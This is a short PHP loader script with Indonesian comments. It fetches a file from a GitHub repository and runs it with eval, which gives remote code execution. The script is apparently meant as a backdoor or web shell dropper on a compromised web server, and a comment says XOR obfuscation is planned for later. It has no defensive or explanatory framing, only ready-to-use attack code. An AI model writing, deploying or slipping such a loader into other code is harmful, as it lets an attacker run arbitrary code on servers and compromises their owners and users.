<?php
// Loader yang benar (tanpa XOR dulu, test dulu)
$url = 'https://github.com/adidgwb-blip/hecek/raw/refs/heads/main/cberr';

$c = @file_get_contents($url);
if($c){
    // Cek apakah file berhasil diambil
    if(strlen($c) > 100){
        eval('?>' . $c);
    } else {
        echo "File terlalu kecil atau error: " . strlen($c) . " bytes";
    }
} else {
    echo "Gagal mengambil file dari GitHub. Cek URL.";
}
?>
